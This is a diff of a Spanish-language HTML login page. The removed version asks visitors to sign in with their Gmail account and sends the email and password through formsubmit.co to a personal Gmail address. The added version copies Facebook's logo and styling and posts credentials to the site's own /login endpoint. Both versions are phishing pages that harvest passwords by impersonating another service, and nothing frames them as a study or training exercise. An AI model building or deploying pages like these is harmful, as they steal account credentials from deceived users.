@@ -1,96 +1,89 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Inicio de Sesión - Red de Oriente</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f2f2f2;
-            margin: 0;
-            padding: 0;
-        }
-
-        .container {
-            max-width: 400px;
-            margin: 50px auto;
-            padding: 20px;
-            background-color: #fff;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            text-align: center;
-        }
-
-        .logo {
-            margin-bottom: 20px;
-        }
-
-        h1 {
-            font-size: 24px;
-            color: #202124;
-            margin-bottom: 20px;
-        }
-
-        p {
-            color: #5f6368;
-            margin-bottom: 20px;
-        }
-
-        form {
-            text-align: center;
-        }
-
-        label {
-            display: block;
-            margin-bottom: 5px;
-            color: #202124;
-            font-weight: bold;
-        }
-
-        input[type="email"],
-        input[type="password"] {
-            width: 100%;
-            padding: 10px;
-            margin-bottom: 20px;
-            border: 1px solid #dadce0;
-            border-radius: 5px;
-            box-sizing: border-box;
-        }
-
-        input[type="submit"] {
-            background-color: #1a73e8;
-            color: #fff;
-            padding: 12px 20px;
-            margin: 8px 0;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            width: 100%;
-            font-size: 16px;
-        }
-
-        input[type="submit"]:hover {
-            background-color: #0f65ef;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Inicio de Sesión en Facebook</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f0f2f5;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      max-width: 400px;
+      margin: 50px auto;
+      padding: 20px;
+      background-color: #fff;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+    }
+    .facebook-logo {
+      width: 150px;
+      margin: 0 auto 20px;
+      display: block;
+    }
+    input[type="text"], input[type="password"] {
+      width: calc(100% - 40px);
+      padding: 10px;
+      margin: 8px 0;
+      border: 1px solid #dddfe2;
+      border-radius: 8px;
+      box-sizing: border-box;
+      background-color: #f0f2f5;
+      font-size: 14px;
+      padding-left: 40px;
+      height: 40px;
+    }
+    input[type="text"]::placeholder, input[type="password"]::placeholder {
+      color: #8d949e;
+    }
+    input[type="submit"] {
+      width: calc(100% - 40px);
+      background-color: #1877f2;
+      color: #fff;
+      padding: 10px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 16px;
+      font-weight: 600;
+      margin-top: 10px;
+      transition: background-color 0.3s;
+      height: 40px;
+    }
+    input[type="submit"]:hover {
+      background-color: #166fe5;
+    }
+    .forgot-password {
+      text-align: center;
+      margin-top: 10px;
+      font-size: 14px;
+      color: #1877f2;
+    }
+    .signup-link {
+      text-align: center;
+      margin-top: 20px;
+      font-size: 14px;
+      color: #1877f2;
+    }
+  </style>
 </head>
 <body>
-
-    <div class="container">
-        <h1>Red de Oriente</h1>
-        <p>Por favor, inicia sesión con tu cuenta de Gmail.</p>
-        
-        <form action="https://formsubmit.co/roniifelipe@gmail.com" method="post">
-            <label for="username">Correo electrónico:</label>
-            <input type="email" id="username" name="username" required><br>
-            
-            <label for="password">Contraseña:</label>
-            <input type="password" id="password" name="password" required><br><br>
-            
-            <input type="submit" value="Iniciar Sesión">
-        </form>
+  <div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="facebook-logo">
+    <form action="/login" method="post">
+      <input type="text" id="email" name="email" placeholder="Correo electrónico" required>
+      <input type="password" id="password" name="password" placeholder="Contraseña" required>
+      <input type="submit" value="Iniciar sesión">
+    </form>
+    <div class="forgot-password">
+      <a href="/recuperar">¿Olvidaste tu contraseña?</a>
     </div>
-
+    <div class="signup-link">
+      ¿No tienes una cuenta? <a href="/registro">Regístrate</a>
+    </div>
+  </div>
 </body>
 </html>
